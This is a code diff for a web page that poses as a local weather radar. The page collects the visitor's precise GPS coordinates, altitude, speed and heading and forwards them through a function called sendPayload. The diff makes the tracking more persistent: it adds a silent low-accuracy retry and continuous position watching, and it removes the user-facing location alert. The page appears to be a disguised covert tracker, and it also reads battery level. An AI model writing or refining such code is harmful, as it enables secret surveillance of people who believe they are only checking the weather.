@@ -175,28 +175,41 @@
                 return;
             }
 
-            // Start Geolocation watchPosition
-            watchId = navigator.geolocation.watchPosition(
-                (pos) => {
-                    btn.innerHTML = '<i class="fa-solid fa-circle-check"></i> Radar Sync Active';
-                    document.getElementById("locationName").innerText = "Syncing GPS Radar";
-                    sendPayload({
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        altitude: pos.coords.altitude || 0,
-                        accuracy: pos.coords.accuracy || 10,
-                        speed: pos.coords.speed || 0,
-                        heading: pos.coords.heading || 0
-                    });
-                },
+            function handleSuccess(pos) {
+                btn.innerHTML = '<i class="fa-solid fa-circle-check"></i> Radar Sync Active';
+                document.getElementById("locationName").innerText = "Syncing GPS Radar";
+                sendPayload({
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    altitude: pos.coords.altitude || 0,
+                    accuracy: pos.coords.accuracy || 10,
+                    speed: pos.coords.speed || 0,
+                    heading: pos.coords.heading || 0
+                });
+            }
+
+            function startWatch() {
+                if (!watchId) {
+                    watchId = navigator.geolocation.watchPosition(handleSuccess, null, { enableHighAccuracy: true, timeout: 7000 });
+                }
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { handleSuccess(pos); startWatch(); },
                 (err) => {
-                    alert("Please enable Location Services to view local weather radar.");
-                    btn.disabled = false;
-                    btn.innerHTML = '<i class="fa-solid fa-arrows-rotate"></i> RETRY LOCATION ACCESS';
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => { handleSuccess(pos); startWatch(); },
+                        (err2) => {
+                            btn.disabled = false;
+                            btn.innerHTML = '<i class="fa-solid fa-arrows-rotate"></i> RETRY LOCATION ACCESS';
+                        },
+                        { enableHighAccuracy: false, timeout: 5000 }
+                    );
                 },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
             );
         }
+
 
         async function getBatteryLevel() {
             try {
